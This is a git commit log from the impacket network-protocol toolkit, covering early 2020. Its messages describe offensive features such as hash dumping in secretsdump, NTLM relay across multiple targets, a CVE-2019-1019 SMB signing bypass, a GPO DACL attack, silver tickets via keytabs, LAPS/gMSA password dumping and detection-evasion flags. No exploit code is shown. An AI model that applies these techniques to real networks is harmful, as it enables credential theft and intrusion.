Date:   Thu Mar 26 15:28:31 2020 -0300

    About to tag release

commit edcc564dd280c6d5d5564d756bd3e2c781907875
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 26 15:26:21 2020 -0300

    About to tag release

commit 69fee03fd8c120ec7ed0b1e630f7dcc5780fa3f9
Merge: 9e953679 496d3c82
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 25 17:10:15 2020 -0300

    Merge pull request #802 from 0xdeaddood/SAM_dump
    
    Add error handling for hashes extraction in secretsdump.py

commit 9e953679efa81f88a71666f60bb2eb303756b153
Merge: 0056b61c 156f82ca
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Mar 25 16:17:48 2020 -0300

    Merge pull request #803 from 0xdeaddood/LDAP_shell_errors
    
    Add detailed error messages to the ldap_shell.py

commit 156f82caf7c8910a791990f75557c65648454fb7
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Mar 20 16:08:35 2020 -0300

    Add detailed error messages to the ldap_shell.py
    Add some minor changes

commit 496d3c82a5fcee53cf105ce63000e52dd89e067a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 18 21:20:10 2020 -0300

    Add error handling for hashes extraction in secretsdump
    After the Fall Creators Update (version 1709), Windows installations
    present a special account named WDAGUtilityAccount. This account is
    part of the Windows Defender Application Guard and is often disabled.
    In Windows Server 2019, this account, when WDAG is disabled, doesn't
    have hash information. For this reason, when secretsdump.py is
    processing the account, the local SAM hashes extraction fails.
    This PR adds error handling for accounts that for some reason don't have
    hash information.

commit 0056b61ca52e13acf05d101518976980f1592d85
Merge: 8afe4fe1 3e184044
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Mar 13 16:05:19 2020 -0300

    Merge pull request #792 from themaks/patch-1
    
    Change padding between negotiate contexts

commit 3e184044c567042268a9b06fef4fbb7c471862b9
Author: Maxime Meignan <meignanmaxime@hotmail.fr>
Date:   Fri Mar 13 10:36:53 2020 +0100

    Change padding between negotiate contexts
    
    Since `Subsequent negotiate contexts MUST appear at the first 8-byte aligned offset following the previous negotiate context`, when a negotiate context's end is already 8-byte aligned, padding should be 0 and not 8.

commit 8afe4fe1044dc47faae25d2f3ad6e61217cc5898
Author: asolino <bethus@gmail.com>
Date:   Thu Mar 12 23:57:21 2020 -0300

    Adding SMB 3.1.1 support for Client SMB Connections
    
    - Clients do not advertise this version by default (not sure if we want to yet) so you will need to explicity set the `preferredDialect` to `SMB2_DIALECT_311` when creating a `SMBConnection` instance.
    - PreAuthIntegrity and Encryption Capabilities supported: The NegotiateContexts will be created accordingly in the `SMB2_NEGOTIATE` packet. You can enfore encryption uncommenting a line when the contexts are created. I found the server supports encryption even if they don't advertise it.
    - Signing, Application, Encryption and Decryption keys are now calculated different depending on the SMB3 version specified.
    - Compression is not yet supported, but the structures are all there (`SMB2_COMPRESSION_CAPABILITIES`,`SMB2_COMPRESSION_TRANSFORM_HEADER`, `SMB2_COMPRESSION_PAYLOAD_HEADER`, `SMB2_COMPRESSION_PATTERN_PAYLOAD_V1`) for playi
    ng at will :)

commit 0b46f198042626a1ecd2846d22db355453e29c03
Merge: 9d4a9116 896f78df
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 9 13:41:59 2020 -0300

    Merge pull request #786 from rmaksimov/ntlmrelayx-and-byte-strings-fixes
    
    Ntlmrelayx and byte strings fixes

commit 9d4a911686f9ae91c50154f529b123a108725d73
Merge: 470024fc fe305dbf
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 9 11:13:54 2020 -0300

    Merge pull request #772 from fridgehead/ldapfun
    
    Added GPO writedacl attack to ldapshell

commit 470024fcea41c13d5a691cd6ea705467c5d31b48
Merge: e0c1b9dd dbbfc78c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 9 10:18:11 2020 -0300

    Merge pull request #785 from MarioVilas/patch-1
    
    Fixed crash on Wine when Git was not installed

commit 896f78df183a0b1e73f0ff9c5324e584f6bea3f7
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Mar 8 02:05:47 2020 +0300

    convert UTF-8 to lowercase

commit 865e27e0da10a0f7120baf8f61070848b9c6f83f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Mar 8 01:53:42 2020 +0300

    fix decoding of byte-strings

commit 202aab422fc29e04b5b4be308586aacacbbb86bf
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Mar 8 01:58:32 2020 +0300

    fix byte-string concatenation bug in ntlmrelayx.py

commit dbbfc78ce484ccda1100a47c1bd20a6a82613839
Author: Mario Vilas <mvilas@gmail.com>
Date:   Sat Mar 7 17:37:40 2020 +0100

    Fixed crash on Wine when Git was not installed
    
    wine 'C:\Python27\python.exe' setup.py install
    Traceback (most recent call last):
      File "setup.py", line 17, in <module>
        if call(["git", "branch"], stderr=STDOUT, stdout=open(os.devnull, 'w')) == 0:
      File "C:\Python27\lib\subprocess.py", line 172, in call
        return Popen(*popenargs, **kwargs).wait()
      File "C:\Python27\lib\subprocess.py", line 394, in __init__
        errread, errwrite)
      File "C:\Python27\lib\subprocess.py", line 644, in _execute_child
        startupinfo)
    WindowsError: [Error 2] File not found

commit e0c1b9dd27be01a170eb3a95b46dc20e2da28f16
Merge: 62d59d65 141c675c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 5 18:03:36 2020 -0300

    Merge pull request #704 from MrAnde7son/patch-13
    
    Fix messageId bug in ldap search request

commit 62d59d656a646ab2c9a3e466cdb64f08b0eacf85
Merge: eae8757f a26f2ca1
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Mar 5 10:41:05 2020 -0300

    Merge pull request #783 from 0xdeaddood/NTLMhash_history
    
    Fix NTLM hash history dumping in secretsdump.py

commit a26f2ca13b8c2ae6d9afb03c120f6c92ccb1bb23
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Mar 5 10:09:57 2020 -0300

    * Remove duplicated line
    * Unify hash history structure

commit 1219896f14056cc229632a39e9ceea2846833e22
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Mar 4 14:41:42 2020 -0300

    Fix NTLM hash history dumping in secretsdump.py
    Fix local hash history dumping from Windows Server 2016 and 2019

commit eae8757f7941cce7f8c04ea28c31d8fa2c449ac8
Merge: afe746d2 f6a45b4b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Mar 2 10:16:13 2020 -0300

    Merge pull request #770 from cube0x0/master
    
    Added Support for Dumping gMSA Password

commit afe746d2e2fe90e6eade333e4062caad1b83258b
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 15:37:00 2020 -0300

    Adding keytab support to secretsdump and remote exec scripts
    
    - Added a loadKeysFromKeytab() class method into keytab.py for easier usage from the scripts.

commit 50412c7ff7a4217e454ad0c73641481682838a02
Merge: 05507f0d eb144a21
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:58:36 2020 -0300

    Merge branch 'kcirtapw-unixsilverticket'

commit eb144a2197180a82daa434ab6c3e78e9114bd9f8
Merge: 05507f0d 94f5f299
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:50:05 2020 -0300

    Merge branch 'unixsilverticket' of https://github.com/kcirtapw/impacket into kcirtapw-unixsilverticket

commit 05507f0d651051981544c974785509f484eecefd
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:40:01 2020 -0300

    Added a few test cases from previous PR merge

commit caad03d9c47487236ce42b30cb80535830666ef8
Merge: 03cbe6e8 ba8fcb34
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 25 14:35:49 2020 -0300

    Merge branch 'spinenkoia-master'

commit 94f5f299ec6e488e959d5d783aca15852f4012e5
Author: Patrick Welzel <git@kcirtap.de>
Date:   Mon Feb 24 01:02:50 2020 +0100

    Keytab: fix parsing when entries have rest.
    
    Reworked size and KVNO/kn8 logic. Implemented handling of deleted entries.

commit e3032a5149faba4312142cffc6f40a2932cb0b18
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 23:07:07 2020 +0100

    add option to examples/ticketer.py to read key directly from a UNIX Keytab
    
    Parses Keytab file and extracts matching key for SPN automatically.
    This makes Silver Ticket attacks on unix more convenient. ;)

commit 0abe1c92876052f70d0a30b715fd37744f615914
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 23:05:24 2020 +0100

    add getKey search method to Keytab objects
    
    Make keytabs searchable, including a preferenced list for automatic encryption type selection.
    Also improve KeyBlock usage from the outside

commit 4cbc658a61d76a4a03307015fee39e6e8c9b5d3f
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 21:11:44 2020 +0100

    ensure py2 compatibility
    
    Don't stop here, this is python2.7 land! /o\

commit fbe1ddc0b5b7f0223c55a865bd71e157d419d3d8
Author: Patrick Welzel <git@kcirtap.de>
Date:   Sun Feb 23 20:11:27 2020 +0100

    add implementation for keytab files
    
    Keytab files are used on UNIX to store principals long-term-keys on client systems.
    This implementation is oriented on impacket.krb5.ccache and based on https://repo.or.cz/w/krb5dissect.git/blob_plain/HEAD:/keytab.txt
    It should help run successfull SilferTicket attacks against UNIX based targets.

commit f6a45b4b9a64fd88db8cc828f3a375613792122c
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 23:25:00 2020 +0100

    Add files via upload

commit 1257e0c3d78e938751b1d50b1f1f36226d7a35c7
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 13:24:15 2020 -0900

    fk up

commit 43467061d389ea9e8a64d79fdba84b37cfc3cbe0
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 23:22:53 2020 +0100

    Add files via upload

commit bb1a35150bf9acfdbd1642511aa192e7e4f5f7e7
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 23:19:34 2020 +0100

    changed to john output

commit bb9ca16e3b97fb2fb51f937367e66bf8c020b02d
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Fri Feb 21 22:50:43 2020 +0100

    Add files via upload

commit ba8fcb34233fde50ba2fe4be92c8436596ce5d7d
Author: Спиненко Иван ispinenko@ussc.ru <ispinenko@ussc.ru>
Date:   Fri Feb 21 17:17:50 2020 +0500

    Added helper from method 3.1.4.19 ElfrOldestRecord (Opnum 5).

commit 03cbe6e86424b45fa0e0e6c0a0c9326ab71ec656
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:13:30 2020 -0300

    Removing

commit adc3905fac8856449baaaf623fe199796e0211b5
Merge: b91d2e3d 6bc0d526
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:11:10 2020 -0300

    Merge branch 'Zer1t0-ticket_converter'

commit 6bc0d5262ac29192a337c12eca5d048df8e79032
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:09:39 2020 -0300

    Renaming example + adding version banner

commit 7fe8aaab1dd96208bce73765b270e00230e38f09
Merge: b91d2e3d c2a92c53
Author: asolino <bethus@gmail.com>
Date:   Thu Feb 20 18:05:04 2020 -0300

    Merge branch 'ticket_converter' of https://github.com/Zer1t0/impacket into Zer1t0-ticket_converter

commit b91d2e3d4c5bd949d43f2ceee7112ae2a7a66a83
Merge: d757c3a4 a45e4a65
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Feb 20 11:00:39 2020 -0300

    Merge pull request #712 from cnotin/patch-1
    
    nmb.py: stop using select() in non_polling_read()

commit d757c3a402e59c9c6e01d6a457a10af4dec836f3
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 19 16:46:20 2020 -0300

    Do not allow default values to persist based on itemValue
    
    - This should address https://github.com/SecureAuthCorp/impacket/issues/768, although testing is needed.
    - I'm concerned this could break https://github.com/SecureAuthCorp/impacket/pull/646. Please @stuken can you verify?
    - Down the road we should parse the NdTable that defines better rules on whether to follow the default value or not. (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/65bcd0c2-b3f3-49a7-b4aa-c972cdc0774b)

commit f4947f0c0dcf5f8bc1ed3af012831cf7b9bcac37
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 19 13:52:44 2020 -0300

    Removing forgotten debug messages :)

commit 2aa01011dc875a15aaec6e535a87e1c8a1d6032b
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 19 13:48:06 2020 -0300

    Adding port to Python3 on MSSQL Authentication use case and some column types.
    
    - Not sure whether it covers all the TDS columns, testing's needed.

commit a2370adc9b74fcf3cee60aab1caf17103c04cc60
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 11:15:04 2020 -0900

    Add files via upload

commit e5e676d7db3ac6fe19212184b1fa61554c2d04ac
Merge: 5259ed0f 1fdaac63
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 17 16:34:37 2020 -0300

    Merge pull request #771 from 0xdeaddood/dump_unicode
    
    Add unicode support for Python 2.x and 3.x to secretsdump

commit 1fdaac63cf6fffb1119c5a891aca1737faceca07
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Feb 17 14:53:07 2020 -0300

    Add unicode support for Python 2.x and 3.x to secretsdump.

commit baf7dba42b20bdc844ff04b876ee76b477ce5169
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 10:34:32 2020 -0500

    Add files via upload

commit 265caa4fb8e321dfb06ea6c19aec6112f4d7dece
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 10:33:43 2020 -0500

    Add files via upload

commit 2c88da85b1dbd70f7e21001506237bc8ac80e972
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Mon Feb 17 10:32:57 2020 -0500

    Add files via upload

commit 5259ed0f30f03658d1d4fd1f6a6ed5821847852d
Merge: 70c38fbe d14a7c5c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Feb 14 11:16:03 2020 -0300

    Merge pull request #766 from justin-p/fix-delegate-access
    
    Fix addComputer when using the delegate access flag

commit fe305dbfdcf1ed89ff0dc47a2acda155f16d18b8
Author: Tom Wyatt <tom@imakethin.gs>
Date:   Wed Feb 12 14:53:48 2020 +0000

    Added GPO writedacl attack to ldapshell
    
    Added a write_gpo_dacl command to the ldapshell. Takes a SamAccountName
    and GPO guid (with surrounding {}) and adds a "Full Access" ACE to the
    DACL

commit 70c38fbec76c483985349bba547ca24a2bd3eea7
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 11 10:10:47 2020 -0300

    Clarifying new target selection criteria

commit a0aca12c29d5ce80373ea6b83f9d774089b226bb
Merge: 410fee74 0aa4f769
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 10 17:27:51 2020 -0300

    Merge pull request #767 from 0xdeaddood/relay-user-multi
    
    Support for multiple relays through one SMB connection in ntlmrelayx.py

commit 0aa4f769ac378ba6ae29c1c9397d71a38d7d01fe
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Feb 10 11:00:37 2020 -0300

    Fix some issues in the target processor

commit d9cd556454fa267b9ccdf2f0512cf71adc4ac664
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 6 15:13:20 2020 -0300

    Add some changes related to PY3 compatibility

commit 4dd4921ce581a376e198edb0a3197c3babf6993e
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 6 00:27:43 2020 -0300

    Adding changes to support CVE-2019-1019 "Bypass SMB singing for unpatched machines" in SMBv1

commit 71fd1e27249d332fff19386e672f2fb6ea7c95af
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Feb 6 00:19:56 2020 -0300

    Adding changes to support CVE-2019-1019 "Bypass SMB singing for unpatched machines" in SMBv2

commit 95c214394176111cff9d198d8bcbbed0ef64792f
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 20:31:16 2019 -0300

    Support for targets with users specified and multiple relays using same connection
    
    * This add SMBv1 support (SMBv2 in previous commit)

commit 955e88747fce6b125c075ffe993de6b6e6ee6ee1
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 12:52:19 2019 -0300

    Support for targets with users specified and multiple relays using same connection
    
    1. You can know specify targets with usernames (e.g. smb://Administrator@1.1.1.1 or smb://CONTOSO\Administrator@1.1.1.1 - be aware of the backslash) and the SMBRelayServer (hopefully the HTTP server soon) will verify the user that connected to us before attempting to relay to a target.
    The approach we're using is always authenticate the user locally (against our SMB Server) and then, right after the first iteraction the client does (will always be a TreeConnect) we decide where to relay (or not) and force the client to authenticate again (using STATUS_NETWORK_SESSION_EXPIRED).
    
    2. Since we can use the client as an oracle for NTLM Auth (by means of STATUS_NETWORK_SESSION_EXPIRED), the process will continue until all targets for the connected user are exhausted, meaning there will be many relays happening from a single connection.

commit 032a19391185485afc7040620c4c040ece401e47
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 12:50:12 2019 -0300

    Getting rid of SPNEGO for NTLM Relay
    
    1) We don't actually need it (mostly sure, testing needed), and will help in some scenarios where mechListMIC is requested (and we don't have it).

commit 95f95915e54cc743c78d8683b14f9a3e39b3c0c7
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 29 12:35:34 2019 -0300

    TargetsProcessor changes
    
    1) The --randomize option is applied in the constructor (using random.shuffle)
    2) We have two candidates now: namedCandidates (targets with identity specified) and generalCandidates (just targets w/o identity). I'm not convinced of the names tho (might change). The reason is to differentiate them when calling getTarget()
    3) getTarget() reworked. You can specify the identity you already captured so we can better chose the target. The logic now should be:
       a. If identity is specified, it will first search int the namedCandidates for a fit
       b. If no fit is found, then it will iterate over the generalCandidates list, but, if an identity was specified, it will check it hasn't been relayed successfully already, avoiding unnecesary work. If no identity was specified, it'll pick the first one on that list.
       c. If there's no fit at all in some of the steps, this method can NOW return None, and the caller should act accordingly.
       d. ToDo: We should have another list of failed attempts (with user) and check that inside this method so we do not retry those targets.
    4) Comments are allowed in target files (lines starting with '#')
    
    Didn't test if the file watcher keeps working tho.

commit 410fee7481f4f96be6aa753bcaf8655233d8762d
Merge: 34afbfc5 c0b4f075
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 10 13:54:16 2020 -0300

    Merge pull request #758 from praetorian-adam-crosser/master
    
    Added LAPS Dumping Support

commit 34afbfc50ae41db4098122f663a6f247b0b8f279
Merge: 8d4c9148 b938f422
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 10 10:29:36 2020 -0300

    Merge pull request #765 from justin-p/non-interactive-ldap-fix
    
    fix non-interactive LDAP

commit d14a7c5c2630ff56a2bb4131c0346547934f88ed
Author: Justin Perdok <justin-p@users.noreply.github.com>
Date:   Sun Feb 9 21:22:36 2020 +0100

    Update ldapattack.py

commit b938f422e0747cf6d879861c5c2d0941b6b3ad02
Author: Justin Perdok <justin-p@users.noreply.github.com>
Date:   Sun Feb 9 15:14:50 2020 +0100

    fix non-interactive LDAP

commit c0b4f0751408e42d0635312cc6d8a52054af190d
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Thu Feb 6 18:10:30 2020 -0600

    Updated Debug Messages and Fixed Early Exit Issue

commit 8d4c91481b01dae9f62804893fcc74a40ffc7c45
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 5 19:52:39 2020 -0300

    Print Library's installation path by default when -debug is specified

commit 326e4bd8aa133f27f09f132d6934547cdd320494
Author: asolino <bethus@gmail.com>
Date:   Wed Feb 5 17:51:54 2020 -0300

    Adjusting year and adding getInstallationPath()
    
    - To be used soon in the examples

commit 3c09a2baf503f6a062b6c4a56e9523f62668dd8e
Merge: d4c79287 b4362ee0
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 5 17:21:01 2020 -0300

    Merge pull request #761 from jsherwood0/master
    
    Single-source the version and standardize

commit d4c792872ecff98f27e27d017c0f02713c7a8b91
Merge: 13cfc72a 13885535
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Feb 5 14:26:25 2020 -0300

    Merge pull request #762 from mohemiv/master
    
    Improving dcomexec.py/atexec.py

commit 13885535d713f6a93cbd458bd189070b6532d08b
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Wed Feb 5 06:37:41 2020 +0300

    Added encoding support for dcomexec.py/atexec.py and some improvements for atexec.py

commit b4362ee0acbf0f9b76e8e2d92f2c644d13c0ab09
Author: root <root@vmkalirolling.patchadvisor.com>
Date:   Tue Feb 4 18:56:34 2020 -0500

    Add git short hash for the commit to version

commit c33bed05f523d114d3eb9db1de9b317dc7a4dc82
Author: root <root@vmkalirolling.patchadvisor.com>
Date:   Mon Feb 3 17:12:40 2020 -0500

    Single-source the version and standardize
    
    - Scheme now uses semantic+pre-release+local versioning
      ( see https://bit.ly/36QdfJX )
    - Version now pulls date timestamp from last commit if in a git dir
    - Banner now pulls version directly from setup.py version
    - Eliminates case where multiple different version all display the
      same version number in the banner

commit 13cfc72ac9b0ff255afdd99ebc558e6fad2b1e57
Merge: a1a8d470 9e58e1f3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Feb 3 11:08:52 2020 -0300

    Merge pull request #747 from mlefebvre/ldap_shell
    
    Added LDAP interactive mode to ntlmrelayx.

commit a1a8d470319c73eba729d9b51969e94d7621c4e2
Merge: 55dd623f a80e710c
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Jan 30 17:48:21 2020 -0300

    Merge pull request #746 from mlefebvre/fix_python3_interactive
    
    Fixed UnsupportedOperation('not writable') when using interactive shell with Python 3.

commit 55dd623f646453e4913355f9b09cc8f8d4fd2bbe
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 30 15:15:43 2020 -0300

    Fixing PGUID_ARRAY pointing to the right structure
    
    Fixes https://github.com/SecureAuthCorp/impacket/issues/729

commit 5f51d2884021a96161485c9d7a1ce4b6bd141a1a
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Wed Jan 29 13:17:08 2020 -0600

    LAPS Dumping Support

commit 1df2ec3674d17514e9262bf9869741a83d5b6285
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Wed Jan 29 12:51:09 2020 -0600

    LAPS Dumping Support

commit 4a5403c3c15875a281a69f95f5fe02edcf6969e6
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 29 11:34:59 2020 -0300

    Changing LDAP3 version requirements
    
    - Matching ldapdomaindump requirements
    - Should address https://github.com/SecureAuthCorp/impacket/issues/742

commit f5156b1f45ac74d42d7337583605ecd3b6d7f722
Merge: 2aefcc5e 4661adb0
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 27 15:21:37 2020 -0300

    Merge branch 'rmaksimov-smb1_dialect_fix'

commit 4661adb094b30e8d709d44e9556d3879a1c4b911
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 27 15:21:18 2020 -0300

    Removed commented lines

commit 9ce62d7f711bf12cc1c2cce6219f2a82e102142b
Merge: 2aefcc5e d49cc05d
Author: asolino <bethus@gmail.com>
Date:   Mon Jan 27 15:20:13 2020 -0300

    Merge branch 'smb1_dialect_fix' of https://github.com/rmaksimov/impacket into rmaksimov-smb1_dialect_fix

commit 2aefcc5e01c12bc18aa7ab6612efe598d95fb682
Merge: 36126410 39b99c35
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 27 10:21:21 2020 -0300

    Merge pull request #750 from mohemiv/master
    
    Added two missing DCE/RPC calls in tsch.py

commit 361264100afb3d5068fa9a6c9716cbe6795ab64b
Merge: bf437b9c 71330818
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 21 13:21:55 2020 -0300

    Merge branch 'G0ldenGunSec-findDelegation'

commit 713308189cd225ebb6af2c966d0c0626ccbbe85d
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 21 13:20:52 2020 -0300

    Minor changes post merge
    
    - Fixed copyright year
    - Optimized imports
    - Fixed 3.8 warnings
    - Long lines no good for reading, breaking them.

commit 6a1fc6516e7c22a80732616f914a5f4ea2e4cb9b
Merge: 8df51ad2 30fa6825
Author: asolino <bethus@gmail.com>
Date:   Tue Jan 21 13:14:50 2020 -0300

    Merge branch 'findDelegation' of https://github.com/G0ldenGunSec/impacket into G0ldenGunSec-findDelegation

commit 39b99c35f5885afe850f0c1f83ccc3398bb33c1d
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Jan 20 01:12:15 2020 +0300

    Added missing opnum line for SchRpcEnableTask in tsch.py

commit bd85a5c66ee9ad5cf57adfb77df0a24eb47cedd2
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Mon Jan 20 00:56:37 2020 +0300

    Added two missing DCE/RPC calls in tsch.py

commit d49cc05d450d01d3f820dd96d710da8f935c6551
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Thu Jan 16 23:59:40 2020 +0300

    fix connection issue in smbexec.py and samrdump.py

commit 30fa682554640111cb67d27174d812bb5e793ff6
Author: G0ldenGunSec <28241763+G0ldenGunSec@users.noreply.github.com>
Date:   Wed Jan 15 14:57:39 2020 -0600

    findDelegation.py
    
    Simple script to quickly list all delegation relationships (unconstrained, constrained, resource-based constrained) in an AD environment.

commit 9e58e1f35c1c6125c601afe352f24d2b784ecbe5
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 12:55:13 2020 -0500

    Fixed flake8 error. reload doesn't exist in python 3.

commit c43e378d5ae6139a437587cd15ea1e99b77ab755
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 12:20:01 2020 -0500

    Updated ntlmrelayx.py help.

commit 5f238c5b8f95daada58e33c307e27504708879f8
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 11:57:04 2020 -0500

    Added an interactive shell to perform LDAP operations.

commit a80e710c5d84444837b06334059fe5d960c19cdb
Author: Mathieu Gascon-Lefebvre <mathieuglefebvre@gmail.com>
Date:   Wed Jan 15 10:44:16 2020 -0500

    Fixed python 3 interactive shell.

commit bf437b9c0a489a17e199cdc8899a89914c1c3113
Merge: 2b7faf76 416f1893
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 13 14:19:14 2020 -0300

    Merge pull request #721 from G0ldenGunSec/master
    
    Add delegation information to GetUserSPNs.py

commit 2b7faf763bd9b61fc1ae8a681e86448b0bd33869
Merge: 8df51ad2 d3489099
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 13 14:18:03 2020 -0300

    Merge pull request #745 from 0xe7/delegate-to-sid
    
    Added support for supplying the sid as the escalate user for delegati…

commit d3489099a80a1ccb0f559abf04dc7f6facd265d3
Author: 0xe7 <charlie@exploit.ph>
Date:   Sun Jan 12 15:03:26 2020 +0000

    Added support for supplying the sid as the escalate user for delegation attacks

commit 8df51ad2a13017998bb01ac7f4c53f05449d99f4
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 10 10:54:07 2020 -0300

    Python3 support for serve_wpad() method
    
    * Should partially address https://github.com/SecureAuthCorp/impacket/issues/744

commit 141e00dccdcc31fc4cab2ec6fae0e9bce2ad2934
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 10 10:53:12 2020 -0300

    Setting a default value for wpad-auth-num (default:1)
    
    * Should partially address https://github.com/SecureAuthCorp/impacket/issues/744

commit 1f927fd0d1917a1d5fc50753bc8b04521fc11d83
Merge: f1db74d5 495ae0ea
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 9 14:33:54 2020 -0300

    Merge branch 'BarakSilverfort-nrpc-unicode-errors'

commit 495ae0ea1b5801fd57f22e982cb829739b9ba353
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 9 14:33:23 2020 -0300

    Porting getSSPType1() to Python3

commit 78048b7ba598d454478d3753887016f783df6c62
Merge: f1db74d5 65f10dde
Author: asolino <bethus@gmail.com>
Date:   Thu Jan 9 14:24:34 2020 -0300

    Merge branch 'nrpc-unicode-errors' of https://github.com/BarakSilverfort/impacket into BarakSilverfort-nrpc-unicode-errors

commit 416f1893c93f3a067a02f901f3cd5ee2d6968629
Author: G0ldenGunSec <28241763+G0ldenGunSec@users.noreply.github.com>
Date:   Wed Jan 8 20:53:34 2020 -0600

    fixed python 3 issues
    
    tabs to spaces

commit 65f10ddefe863c422810a8cb3c313a697c259c99
Author: Barak Hirsch <barak@silverfort.com>
Date:   Wed Jan 8 15:11:26 2020 +0200

    Fix nrpc to work for python 3

commit f1db74d5e851c4cef38494c7e92a152f70fb9d46
Merge: fb723db3 96b4fc47
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 7 21:35:48 2020 -0300

    Merge pull request #737 from GoSecure/fix_736
    
    Fixed the missing python 2 to python 3 conversions in rrp.py

commit fb723db3c0062bbeb79025412b66f287ccce3e66
Merge: c0e59d2f e2fe6938
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Jan 7 16:47:48 2020 -0300

    Merge pull request #728 from GoSecure/more_flags
    
    Added flags to SMBExec and PSExec to bypass badly made detection use cases

commit c0e59d2fcf01b52a1f66ed72bef6f2c1d3eb6530
Merge: 0502d596 fff7bc36
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 6 15:44:00 2020 -0300

    Merge pull request #725 from 0xdeaddood/raiseChild_RID
    
    RaiseChild RID feature

commit 0502d5960649d39bebd87e2c67de72f98403e0ff
Merge: bdf2e3d9 3b41d48e
Author: Alberto Solino <asolino@users.noreply.github.com>
